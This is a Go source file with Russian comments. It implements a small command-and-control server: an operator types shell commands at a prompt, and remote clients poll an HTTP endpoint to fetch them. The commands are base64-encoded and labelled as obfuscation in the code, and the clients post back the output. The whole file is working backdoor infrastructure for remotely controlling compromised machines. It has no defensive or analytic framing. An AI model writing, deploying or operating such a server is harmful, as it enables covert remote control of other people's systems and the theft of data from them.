package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"sync"
)

var (
	commandQueue = make(chan string)       // Канал для команд
	results      = make(map[string]string) // Хранилище для результатов команд
	resultsMutex = sync.Mutex{}            // Мьютекс для синхронизации доступа к результатам
	new_cmd      string
)

// Функция для отправки команды клиенту
func sendCommand(w http.ResponseWriter, r *http.Request) {
	select {
	case command := <-commandQueue:
		obfuscatedCommand := base64.StdEncoding.EncodeToString([]byte(command))
		fmt.Fprintf(w, obfuscatedCommand)
	default:
		fmt.Fprintf(w, "no new command")
	}
}

// Функция для получения результата от клиента
func receiveResult(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusInternalServerError)
		return
	}
	defer r.Body.Close()

	decodedResult, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		http.Error(w, "Failed to decode result", http.StatusBadRequest)
		return
	}

	result := string(decodedResult)
	fmt.Println("Received result from client:", result)

	// Сохраняем результат (можно использовать идентификатор команды для лучшей организации)
	resultsMutex.Lock()
	results["lastCommandResult"] = result
	resultsMutex.Unlock()

	fmt.Fprintln(w, "Result received")
}

// Функция для добавления команды в очередь
func addCommand(command string) {
	commandQueue <- command
}

func main() {
	http.HandleFunc("/getCommand", sendCommand) // Путь для отправки команд
	http.HandleFunc("/getRes", receiveResult)   // Путь для приёма результатов

	go func() {
		for {
			fmt.Print("CMD > ")
			fmt.Scan(&new_cmd)
			addCommand(new_cmd) // Пример команды
			// Команду можно добавлять по определённому интервалу или по событию
		}
	}()

	fmt.Println("Server is listening on port 8080...")
	http.ListenAndServe(":8080", nil)
}
